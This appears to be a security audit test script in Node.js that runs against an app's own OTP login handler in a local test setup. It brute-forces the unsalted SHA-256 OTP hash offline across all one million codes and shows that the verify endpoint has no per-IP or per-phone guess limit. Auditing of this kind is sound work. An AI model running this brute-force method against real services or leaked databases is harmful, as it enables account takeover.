// Brute-force maths against the real handler (otpVerify has no per-IP/per-phone guess limiter,
// only the 5-try counter on the current code; a fresh send resets tries). Also costs the
// sha256(phone:code) hash if the DB leaks (1,000,000-code space, no salt, no per-row work factor).
// Run: node 09-bruteforce-and-hash.js
'use strict';
const crypto = require('crypto');
const { freshApp, signup } = require('./09-common.js');

(async () => {
  Object.assign(process.env, { OTP_ENABLED: '1', SMS_PROVIDER: 'console' });
  const realLog = console.log; console.log = () => {}; // silence [sms:console] noise
  const { call, store } = freshApp('brute');
  const phone = '+447700900111';
  await signup(call, phone, 'Victim');

  // Find the actual code the server generated, from the stored hash, by trying all 1e6 values
  // the same way an attacker with read access to otp.codes (e.g. a DB dump, or an admin-ish
  // endpoint) could -- this demonstrates the hash gives an attacker nothing to brute against
  // except the SAME 1e6 space as a live guesser, in well under a second offline.
  await call('otpsend', { phone });
  const state = await store.read();
  const pk = crypto.createHash('sha256').update('otp:' + phone).digest('hex').slice(0, 24);
  const rec = state.otp.codes[pk];
  const t0 = Date.now();
  let found = null;
  for (let c = 0; c < 1e6; c++) {
    const cs = String(c).padStart(6, '0');
    const h = crypto.createHash('sha256').update('otpcode:' + phone + ':' + cs).digest('hex');
    if (h === rec.h) { found = cs; break; }
  }
  realLog('offline hash crack: found code', found, 'in', Date.now() - t0, 'ms (full 1e6 space, single core, no salt/stretch)');

  // Live brute force: each otpsend resets tries to 0 and issues a new code (old code immediately
  // invalid), and otpverify has NO per-IP / per-phone limiter beyond that code's own 5 tries.
  // Attempts allowed per hour per number = sends/hour (3, capped by otpSendCheck) x tries/code (5).
  const sendsPerHour = 3, triesPerCode = 5;
  const guessesPerHour = sendsPerHour * triesPerCode;
  const guessesPerDay = guessesPerHour * 24; // otpSendCheck's per-number send limiter is a ROLLING hour, so this repeats every hour indefinitely
  const space = 1e6;
  const pSuccessPerDay = 1 - Math.pow(1 - triesPerCode / space, guessesPerDay / triesPerCode); // each of 24 fresh-code windows gives 5 independent guesses
  realLog('max guesses/number/hour =', guessesPerHour, '(3 sends x 5 tries); per day (every hour repeats) =', guessesPerDay);
  realLog('P(attacker guesses the live code within a day) ~=', (pSuccessPerDay * 100).toFixed(3) + '%', '-- i.e. each 5-min code only gets 5 of 1e6 guesses, so brute force of the ONLINE code is impractical; the exposure is the OFFLINE hash (above), not the live 5-try gate.');

  // Prove otpverify truly has no separate rate limiter: drive exactly triesPerCode+1 wrong
  // verifies right after one send and show it is the code's own counter, not an IP/phone cap,
  // by then sending again and getting a fresh budget of 5 more tries from a DIFFERENT "IP".
  await call('otpsend', { phone }, { ip: '5.5.5.5' });
  let last;
  for (let i = 0; i < 6; i++) last = await call('otpverify', { phone, code: '000000' }, { ip: '6.6.6.' + i });
  realLog('6th wrong verify (after a send) ->', JSON.stringify(last));
  await call('otpsend', { phone }, { ip: '7.7.7.7' }); // 2nd send this hour, still < 3/hr cap
  let r2 = await call('otpverify', { phone, code: '000000' }, { ip: '8.8.8.8' });
  realLog('after a NEW send from a NEW ip, verify from yet another ip ->', JSON.stringify(r2), '(tries counter reset to 0: confirms no IP/phone-level verify limiter exists, only the per-code tries field)');
  process.exit(0);
})();
